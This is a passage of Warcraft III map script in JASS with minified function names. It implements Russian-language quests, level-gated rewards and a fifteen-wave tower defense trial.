function BTS takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=45) then
return false
endif
return true
endfunction
function BTT takes nothing returns nothing
if BTS() then
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[40])
call AddSpecialEffectTargetUnitBJ("overhead",KX,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[40]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Покажите мне путь\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 45+|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Покажите мне путь","Мазарэль давно истощает наши земли. Положите этому конец.
|c006969FFУровень задания: 45+|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[40]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000045|r уровня",.027,255,255,255)
endif
endfunction
function BTU takes nothing returns nothing
set bT=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(bT,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(bT,Condition(function BTR))
call TriggerAddAction(bT,function BTT)
endfunction
function BTV takes nothing returns nothing
call EnableTrigger(bV)
call DisplayTextToForce(GetPlayersAll(),"Мазарэль убит!")
call DestroyEffectBJ(Us[40])
call AddSpecialEffectTargetUnitBJ("overhead",KX,"war3mapImported\\QuestYellow1.mdx")
set Us[40]=GetLastCreatedEffectBJ()
endfunction
function BTW takes nothing returns nothing
set bU=CreateTrigger()
call TriggerRegisterUnitEvent(bU,K3,EVENT_UNIT_DEATH)
call TriggerAddAction(bU,function BTV)
endfunction
function BTX takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$4867616D) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BTY takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BTZ takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BTa takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BTb takes nothing returns boolean
return GetBooleanAnd(BTZ(),BTa())
endfunction
function BTc takes nothing returns boolean
return GetBooleanAnd(BTY(),BTb())
endfunction
function BTd takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=45) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=49) then
return false
endif
return true
endfunction
function BTe takes nothing returns nothing
if BTd() then
call AddHeroXP(GetEnumUnit(),5000,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+10200
else
endif
endfunction
function BTf takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=45) then
return false
endif
return true
endfunction
function BTg takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=45) then
return false
endif
return true
endfunction
function BTh takes nothing returns nothing
if BTg() then
call DisableTrigger(GetTriggeringTrigger())
call UnitAddAbilityBJ($41706974,GetOrderTargetUnit())
call UnitAddAbilityBJ($416E6532,GetOrderTargetUnit())
call CreateItemLoc($49305732,GetUnitLoc(GetTriggerUnit()))
call DestroyEffectBJ(Us[40])
call QuestSetCompletedBJ(YX[40],true)
call DestroyQuest(YX[40])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Итак, Герои. В этом мире сущесвует 5 скрытых обелисков. Изначально видим только один. Уничтожаете один - показывается второй, и так далее. Попробуйте уничтожить все 5")
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BTc))
call ForGroupBJ(Th,function BTe)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF10200 опыта|r, |c00ffff00600 золота|r, |c00ff969650 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BTf() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1800
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+150
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000045|r уровня",.027,255,255,255)
endif
endfunction
function BTi takes nothing returns nothing
set bV=CreateTrigger()
call DisableTrigger(bV)
call TriggerRegisterAnyUnitEventBJ(bV,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(bV,Condition(function BTX))
call TriggerAddAction(bV,function BTh)
endfunction
function BTj takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6830334A) then
return false
endif
return true
endfunction
function BTk takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6830334B) then
return false
endif
return true
endfunction
function BTl takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6830334C) then
return false
endif
return true
endfunction
function BTm takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6830334D) then
return false
endif
return true
endfunction
function BTn takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6830334E) then
return false
endif
return true
endfunction
function BTo takes nothing returns nothing
if BTj() then
call ShowUnitShow(L1)
else
endif
if BTk() then
call ShowUnitShow(L2)
else
endif
if BTl() then
call ShowUnitShow(L3)
else
endif
if BTm() then
call ShowUnitShow(L0)
else
endif
if BTn() then
call PauseUnit(L4,false)
call EnableTrigger(Un)
call DisplayTextToForce(GetPlayersAll(),"Поздравляю, теперь Вы можете сразиться с Ахилом!")
else
endif
endfunction
function BTp takes nothing returns nothing
set bW=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(bW,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(bW,function BTo)
endfunction
function BTq takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$68646877) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BTr takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=5) then
return false
endif
return true
endfunction
function BTs takes nothing returns nothing
if BTr() then
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(bY)
call DestroyEffectBJ(Us[41])
call AddSpecialEffectTargetUnitBJ("overhead",Iy,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[41]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Вы крутые? Докажите!\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 5-13|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Вы крутые? Докажите!","Если Вы настолько хороши, как о Вас говорят, то докажите это, и я Вас вознагражу. Покажите мне для этого Дубину Великана, и, может, быть, я Вам поверю.
|c006969FFУровень за�","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[41]=GetLastCreatedQuestBJ()
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
else
call ne(GetTriggerUnit(),"Задание с |c00ff00005|r уровня",.027,255,255,255)
endif
endfunction
function BTt takes nothing returns nothing
set bX=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(bX,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(bX,Condition(function BTq))
call TriggerAddAction(bX,function BTs)
endfunction
function BTu takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$4930474B)==true) then
return false
endif
return true
endfunction
function BTv takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BTw takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BTx takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BTy takes nothing returns boolean
return GetBooleanAnd(BTw(),BTx())
endfunction
function BTz takes nothing returns boolean
return GetBooleanAnd(BTv(),BTy())
endfunction
function BT0 takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=5) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=13) then
return false
endif
return true
endfunction
function BT1 takes nothing returns nothing
if BT0() then
call AddHeroXP(GetEnumUnit(),2200,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+1500
else
endif
endfunction
function BT2 takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=5) then
return false
endif
return true
endfunction
function BT3 takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=5) then
return false
endif
return true
endfunction
function BT4 takes nothing returns nothing
if BT3() then
call DestroyEffectBJ(Us[41])
call QuestSetCompletedBJ(YX[41],true)
call DestroyQuest(YX[41])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BTz))
call ForGroupBJ(Th,function BT1)
call DestroyGroup(Th)
set Sf=Sf+1
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF1500 опыта|r, |c00ffff00250 золота|r, |c00ff969610 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BT2() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+750
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+30
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff00005|r уровня",.027,255,255,255)
endif
endfunction
function BT5 takes nothing returns nothing
set bY=CreateTrigger()
call DisableTrigger(bY)
call TriggerRegisterEnterRectSimple(bY,D3)
call TriggerAddCondition(bY,Condition(function BTu))
call TriggerAddAction(bY,function BT4)
endfunction
function BT6 takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304833)==true) then
return false
endif
return true
endfunction
function BT7 takes nothing returns nothing
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 35+|r
Пройдите испытание, и получите награду. Всё просто! Если готовы, то вперед!!!
|c00ff7f00(чтобы попасть в локацию испытания, кликните на Демонёнка)")
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(ba)
endfunction
function BT8 takes nothing returns nothing
set bZ=CreateTrigger()
call TriggerRegisterEnterRectSimple(bZ,D1)
call TriggerAddCondition(bZ,Condition(function BT6))
call TriggerAddAction(bZ,function BT7)
endfunction
function BT9 takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304833)==true) then
return false
endif
return true
endfunction
function BUB takes nothing returns nothing
call ShowUnit(J8,true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 50+|r
Пройдите испытание, и получите награду. Всё просто! Если готовы, то вперед!!!
|c00ff7f00(чтобы попасть в локацию испытания, кликните на Совуха)")
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(bc)
endfunction
function BUC takes nothing returns nothing
set bb=CreateTrigger()
call TriggerRegisterEnterRectSimple(bb,Fp)
call TriggerAddCondition(bb,Condition(function BT9))
call TriggerAddAction(bb,function BUB)
endfunction
function BUD takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BUE takes nothing returns nothing
call SetUnitPositionLoc(GetEnumUnit(),GetRectCenter(Du))
endfunction
function BUF takes nothing returns nothing
call ForGroupBJ(GetUnitsInRectMatching(D1,Condition(function BUD)),function BUE)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000ff00Кликните на башню для того, чтобы начать испытание.")
endfunction
function BUG takes nothing returns nothing
set ba=CreateTrigger()
call DisableTrigger(ba)
call TriggerRegisterUnitEvent(ba,JV,EVENT_UNIT_SELECTED)
call TriggerAddAction(ba,function BUF)
endfunction
function BUH takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BUI takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=50) then
return false
endif
return true
endfunction
function BUJ takes nothing returns nothing
if BUI() then
call SetUnitPositionLoc(GetEnumUnit(),GetRectCenter(Dr))
else
endif
endfunction
function BUK takes nothing returns nothing
call ForGroupBJ(GetUnitsInRectMatching(Fp,Condition(function BUH)),function BUJ)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000ff00Кликните на башню для того, чтобы начать испытание.")
endfunction
function BUL takes nothing returns nothing
set bc=CreateTrigger()
call DisableTrigger(bc)
call TriggerRegisterUnitEvent(bc,J8,EVENT_UNIT_SELECTED)
call TriggerAddAction(bc,function BUK)
endfunction
function BUM takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BUN takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Du))
endfunction
function BUO takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BUP takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Du))
endfunction
function BUQ takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BUR takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Du))
endfunction
function BUS takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BUT takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Du))
endfunction
function BUU takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BUV takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Du))
endfunction
function BUW takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BUX takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Du))
endfunction
function BUY takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BUZ takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Du))
endfunction
function BUa takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BUb takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Du))
endfunction
function BUc takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BUd takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Du))
endfunction
function BUe takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BUf takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Du))
endfunction
function BUg takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BUh takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Du))
endfunction
function BUi takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BUj takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Du))
endfunction
function BUk takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BUl takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Du))
endfunction
function BUm takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BUn takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Du))
endfunction
function BUo takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BUp takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Du))
endfunction
function BUq takes nothing returns boolean
if not (IsUnitAliveBJ(Jm)==true) then
return false
endif
return true
endfunction
function BUr takes nothing returns boolean
if not (IsUnitAliveBJ(Jm)==true) then
return false
endif
return true
endfunction
function BUs takes nothing returns boolean
if not (IsUnitAliveBJ(Jm)==true) then
return false
endif
return true
endfunction
function BUt takes nothing returns boolean
if not (IsUnitAliveBJ(Jm)==true) then
return false
endif
return true
endfunction
function BUu takes nothing returns boolean
if not (IsUnitAliveBJ(Jm)==true) then
return false
endif
return true
endfunction
function BUv takes nothing returns boolean
if not (IsUnitAliveBJ(Jm)==true) then
return false
endif
return true
endfunction
function BUw takes nothing returns boolean
if not (IsUnitAliveBJ(Jm)==true) then
return false
endif
return true
endfunction
function BUx takes nothing returns boolean
if not (IsUnitAliveBJ(Jm)==true) then
return false
endif
return true
endfunction
function BUy takes nothing returns boolean
if not (IsUnitAliveBJ(Jm)==true) then
return false
endif
return true
endfunction
function BUz takes nothing returns boolean
if not (IsUnitAliveBJ(Jm)==true) then
return false
endif
return true
endfunction
function BU0 takes nothing returns boolean
if not (IsUnitAliveBJ(Jm)==true) then
return false
endif
return true
endfunction
function BU1 takes nothing returns boolean
if not (IsUnitAliveBJ(Jm)==true) then
return false
endif
return true
endfunction
function BU2 takes nothing returns boolean
if not (IsUnitAliveBJ(Jm)==true) then
return false
endif
return true
endfunction
function BU3 takes nothing returns boolean
if not (IsUnitAliveBJ(Jm)==true) then
return false
endif
return true
endfunction
function BU4 takes nothing returns boolean
if not (IsUnitAliveBJ(Jm)==true) then
return false
endif
return true
endfunction
function BU5 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetTriggerUnit(),Player(8),true)
call TriggerSleepAction(15.)
set V0=GetRectCenter(Dt)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff1/15")
call CreateNUnitsAtLoc(15,$75303032,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dt,Condition(function BUM)),function BUN)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Du))
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BU4() then
set V0=GetRectCenter(Dt)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff2/15")
call CreateNUnitsAtLoc(15,$75303033,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dt,Condition(function BUO)),function BUP)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BU3() then
set V0=GetRectCenter(Dt)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff3/15")
call CreateNUnitsAtLoc(15,$6E30305A,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dt,Condition(function BUQ)),function BUR)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Dx))
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BU2() then
set V0=GetRectCenter(Dt)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff4/15")
call CreateNUnitsAtLoc(15,$6E303058,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dt,Condition(function BUS)),function BUT)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Du))
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BU1() then
set V0=GetRectCenter(Dt)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff5/15")
call CreateNUnitsAtLoc(4,$75303048,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dt,Condition(function BUU)),function BUV)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Du))
call RemoveLocation(V0)
call TriggerSleepAction(35.)
if BU0() then
set V0=GetRectCenter(Dt)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff6/15")
call CreateNUnitsAtLoc(15,$6E303157,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dt,Condition(function BUW)),function BUX)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Du))
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BUz() then
set V0=GetRectCenter(Dt)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff7/15")
call CreateNUnitsAtLoc(15,$6E303159,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dt,Condition(function BUY)),function BUZ)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Du))
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BUy() then
set V0=GetRectCenter(Dt)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff8/15")
call CreateNUnitsAtLoc(15,$6E303156,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dt,Condition(function BUa)),function BUb)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Du))
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BUx() then
set V0=GetRectCenter(Dt)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff9/15")
call CreateNUnitsAtLoc(15,$6E303158,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dt,Condition(function BUc)),function BUd)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Du))
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BUw() then
set V0=GetRectCenter(Dt)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff10/15")
call CreateNUnitsAtLoc(4,$7530304C,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dt,Condition(function BUe)),function BUf)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Du))
call RemoveLocation(V0)
call TriggerSleepAction(35.)
if BUv() then
set V0=GetRectCenter(Dt)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff11/15")
call CreateNUnitsAtLoc(3,$7530304A,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dt,Condition(function BUg)),function BUh)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Du))
call RemoveLocation(V0)
call TriggerSleepAction(40.)
if BUu() then
set V0=GetRectCenter(Dt)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff12/15")
call CreateNUnitsAtLoc(8,$6E303233,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dt,Condition(function BUi)),function BUj)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Du))
call RemoveLocation(V0)
call TriggerSleepAction(40.)
if BUt() then
set V0=GetRectCenter(Dt)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff13/15")
call CreateNUnitsAtLoc(8,$6E303236,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dt,Condition(function BUk)),function BUl)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Du))
call RemoveLocation(V0)
call TriggerSleepAction(35.)
if BUs() then
set V0=GetRectCenter(Dt)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff14/15")
call CreateNUnitsAtLoc(5,$6E303230,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dt,Condition(function BUm)),function BUn)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Du))
call RemoveLocation(V0)
call TriggerSleepAction(35.)
if BUr() then
set V0=GetRectCenter(Dt)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff15/15")
call CreateNUnitsAtLoc(4,$6E303433,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dt,Condition(function BUo)),function BUp)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Dx))
call RemoveLocation(V0)
call DisplayTextToForce(GetPlayersAll(),"Если в течении 120 секунд Башня погибнет, испытание провалено!")
call TriggerSleepAction(120.)
if BUq() then
call EnableTrigger(be)
call DisableTrigger(ba)
call DisplayTextToForce(GetPlayersAll(),"Поздравляю Вас! Получите Вашу награду!")
call CreateItemLoc($49304A32,GetRectCenter(Dt))
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
endfunction
function BU6 takes nothing returns nothing
set bd=CreateTrigger()
call TriggerRegisterUnitEvent(bd,Jm,EVENT_UNIT_SELECTED)
call TriggerAddAction(bd,function BU5)
endfunction
function BU7 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BU8 takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dr))
endfunction
function BU9 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BVB takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dr))
endfunction
function BVC takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BVD takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dr))
endfunction
function BVE takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BVF takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dr))
endfunction
function BVG takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BVH takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dr))
endfunction
function BVI takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BVJ takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dr))
endfunction
function BVK takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BVL takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dr))
endfunction
function BVM takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BVN takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dr))
endfunction
function BVO takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BVP takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dr))
endfunction
function BVQ takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BVR takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dr))
endfunction
function BVS takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BVT takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dr))
endfunction
function BVU takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BVV takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dr))
endfunction
function BVW takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
